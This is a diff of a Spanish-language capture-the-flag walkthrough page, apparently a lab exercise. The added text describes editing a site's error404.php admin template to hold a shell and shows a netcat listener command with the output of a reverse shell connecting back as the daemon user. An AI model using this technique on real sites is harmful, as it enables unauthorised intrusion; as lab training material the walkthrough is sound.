@@ -469,9 +469,23 @@ Vemos que ahora solo tenemos 11.451 lineas</li>
 <p>Miraremos la pagina de administración e inspeccinamos a ver que podemos hacer para obtener una <em>reverse shell</em></p>
 
 <ul>
-  <li>algo curioso es que no tiene pagina por si se presenta un <em>error404</em>, crearemos la pagina e intentaremos obtener una <em>shell</em> de 
-este modo</li>
+  <li>intentare usar la pagina de <em>error404.php</em> para ganar acceso desde mi maquina</li>
 </ul>
+
+<p>editamos el archivo <em>error404.php</em> con nuestra <em>shell</em> y pongo mi maquina en escucha</p>
+
+<h2 id="ganamos-acceso">Ganamos acceso</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.9.50.132] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.106.35] 46851
+Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 12:56:23 up 52 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+</span></code></pre></div></div>
+
 
         
       </section>
